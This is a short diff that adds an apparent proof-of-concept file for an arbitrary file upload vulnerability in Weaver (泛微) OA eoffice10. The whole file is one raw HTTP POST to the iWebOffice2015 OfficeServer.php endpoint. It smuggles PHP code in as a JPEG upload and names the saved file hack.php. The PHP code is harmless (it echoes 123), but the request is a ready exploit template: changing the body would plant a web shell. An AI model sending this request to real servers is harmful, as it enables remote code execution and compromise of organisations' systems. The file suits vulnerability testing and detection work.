@@ -1,0 +1,21 @@
+# 泛微OA OfficeServer.jsp 任意文件上传漏洞
+POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
+Host: www.testrule.com:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxp1jVeHlgt1biBOb
+Content-Length: 371
+
+------WebKitFormBoundaryxp1jVeHlgt1biBOb
+Content-Disposition: form-data; name="FileData";filename="1.jpg"
+Content-Type: image/jpeg
+
+<?php echo 123;>
+------WebKitFormBoundaryxp1jVeHlgt1biBOb
+Content-Disposition: form-data; name="FormData"
+
+{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'hack.php'}
+------WebKitFormBoundaryxp1jVeHlgt1biBOb--
